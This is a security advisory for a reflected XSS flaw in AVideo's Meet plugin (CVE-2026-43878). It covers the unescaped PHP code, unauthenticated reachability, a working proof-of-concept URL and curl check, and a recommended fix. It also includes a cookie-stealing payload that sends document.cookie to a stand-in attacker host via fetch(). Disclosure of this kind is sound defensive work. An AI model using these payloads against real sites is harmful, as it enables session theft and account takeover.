# [M] Video: Reflected XSS in plugin/Meet/iframe.php via Unescaped user and pass Parameters in JavaScript String Literal

## Summary
Severity: Medium
Advisory: GHSA-mm5f-8q57-4fc4
CVE: CVE-2026-43878
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-mm5f-8q57-4fc4
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

`plugin/Meet/iframe.php` echoes the attacker-controlled `user` and `pass` query parameters unescaped into a JavaScript double-quoted string literal inside a `<script>` block. An attacker who sends a victim to a crafted URL can break out of the string and execute arbitrary JavaScript in the victim's browser in the context of the AVideo origin. No authentication is required if a public Meet schedule exists on the target.

## Details

Root cause is a two-step reflection with no escaping applied at the HTML/JS sink.

**Step 1 — `User::loginFromRequestToGet()` at `objects/user.php:3363-3373`** returns the raw concatenation of `$_REQUEST['user']` and `$_REQUEST['pass']` with no URL-encoding, HTML-escaping, or other sanitization:

```php
public static function loginFromRequestToGet()
{
    if (!empty($_REQUEST['user']) && !empty($_REQUEST['pass'])) {
        $return = "user={$_REQUEST['user']}&pass={$_REQUEST['pass']}";
        if (!empty($_REQUEST['encodedPass'])) {
            $return .= "&encodedPass=" . intval($_REQUEST['encodedPass']);
        }
        return $return;
    }
    return "";
}
```

**Step 2 — `plugin/Meet/iframe.php`** builds `$readyToClose` from that string and emits it into a JS string literal without escaping:

```php
// plugin/Meet/iframe.php:19-22
$userCredentials = User::loginFromRequestToGet();  // set in validateMeet.php:19
$readyToClose = User::getChannelLink($meet->getUsers_id()) . "?{$userCredentials}";
if (Meet::isModerator($meet_schedule_id)) {
    $readyToClose = "{$global['webSiteRootURL']}plugin/Meet/?{$userCredentials}";
    ...
}
```

```php
// plugin/Meet/iframe.php:115-117
function _readyToClose() {
    document.location = "<?php echo $readyToClose; ?>";
}
```

Note that `xss_esc()` IS applied a few lines earlier to the adjacent `nameIdentification` parameter (line 45) — the developer knew about XSS here but missed `$userCredentials`. No call to `json_encode`, `htmlspecialchars`, `xss_esc`, or `rawurlencode` is applied to `$readyToClose`.

**Reachability to unauthenticated users.** `plugin/Meet/validateMeet.php` gates on `Meet::canJoinMeetWithReason()` and `Meet::validatePassword()`:

- `Meet::canJoinMeetWithReason()` (`plugin/Meet/Meet.php:399-402`) returns `canJoin=true` for any visitor when the meet is public (`getPublic() == "2"`):
  ```php
  if ($meet->getPublic() == "2") {
      $obj->canJoin = true;
      $obj->reason = "Is public";
      return $obj;
  }
  ```
- `Meet::validatePassword()` (`plugin/Meet/Meet.php:595-618`) returns `true` when the meet has no password set.
- `validateMeet.php:27` only blocks unauthenticated users when `getPublic()` is empty.

So an unauthenticated attacker can reach the sink against any public, no-password Meet schedule (the most common configuration). With a known password or moderator/admin role, all Meets are reachable.

**Payload construction.** With `user=";}alert(1);function a(){"` and `pass=x`, the rendered script becomes:

```javascript
function _readyToClose() {
    document.location = "CHANNEL_URL?user=";}alert(1);function a(){"&pass=x";
}
```

Parse flow:
1. `document.location = "CHANNEL_URL?user=";` — assignment completes.
2. `}` — closes `_readyToClose`.
3. `alert(1);` — executes immediately at script parse/run time (does NOT require `_readyToClose` to be called).
4. `function a(){"&pass=x";}` — declares a harmless function that absorbs the trailing garbage.

## PoC

**Precondition:** one public Meet schedule with no password (or the attacker supplies `&meet_password=<known>` / is moderator/admin).

1. Attacker sends victim the following URL:
   ```
   https://TARGET/plugin/Meet/iframe.php?meet_schedule_id=1&user=%22%3B%7Dalert(1)%3Bfunction%20a()%7B%22&pass=x
   ```
   URL-decoded `user` payload: `";}alert(1);function a(){"`

2. Server reflects the parameters unescaped into the script block on line 116.

3. Victim's browser parses the script; `alert(1)` fires immediately on page load.

4. Verification:
   ```
   $ curl -s 'https://TARGET/plugin/Meet/iframe.php?meet_schedule_id=1&user=%22%3B%7Dalert(1)%3Bfunction%20a()%7B%22&pass=x' \
       | grep -A1 _readyToClose
   function _readyToClose() {
       document.location = "https://TARGET/channel/...?user=";}alert(1);function a(){"&pass=x";
   ```
   The injected `";}alert(1);function a(){"` sequence appears verbatim in the response, closing the JS string and function and executing `alert(1)` at parse time.

5. Realistic exploitation replaces `alert(1)` with a cookie-exfiltration payload:
   ```
   user=%22%3B%7Dfetch('https%3A%2F%2Fattacker%2Fc%3D'%2Bdocument.cookie)%3Bfunction%20a()%7B%22&pass=x
   ```

## Impact

Reflected XSS in the AVideo origin. An attacker who tricks a logged-in AVideo user into clicking a crafted link can:

- Steal the victim's session cookies / CSRF tokens (cookies are scoped to the AVideo root, not just `/plugin/Meet/`).
- Perform arbitrary authenticated actions as the victim (upload/delete videos, change profile, post comments, change email/password → account takeover).
- Pivot to admin takeover if the victim is an admin (admin endpoints are same-origin).
- Deliver phishing content under the trusted AVideo domain.

The attack is unauthenticated on any install that has at least one public, no-password Meet schedule — which is the default configuration when a moderator creates an open meeting. Scope is Changed because XSS in a plugin subpath can exfiltrate session cookies of the broader AVideo application.

## Recommended Fix

Apply JSON encoding at the sink in `plugin/Meet/iframe.php:116` so the string is always a valid JS literal regardless of its contents:

```php
function _readyToClose() {
    document.location = <?php echo json_encode($readyToClose, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;
}
```

Additionally, harden `User::loginFromRequestToGet()` (`objects/user.php:3363-3373`) to URL-encode the components so downstream sinks cannot be broken out of with `"`, `<`, or other control characters:

```php
public static function loginFromRequestToGet()
{
    if (!empty($_REQUEST['user']) && !empty($_REQUEST['pass'])) {
        $return = "user=" . rawurlencode($_REQUEST['user'])
                . "&pass=" . rawurlencode($_REQUEST['pass']);
        if (!empty($_REQUEST['encodedPass'])) {
            $return .= "&encodedPass=" . intval($_REQUEST['encodedPass']);
        }
        return $return;
    }
    return "";
}
```

Audit every other caller of `loginFromRequestToGet()` (and any other function that returns raw `$_REQUEST['user']` / `$_REQUEST['pass']`) for similar sinks.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-mm5f-8q57-4fc4
- https://nvd.nist.gov/vuln/detail/CVE-2026-43878
- https://github.com/WWBN/AVideo/commit/3298ced2bcf92e4f3acff6ce9bde14edf42ecb5b
- https://github.com/WWBN/AVideo
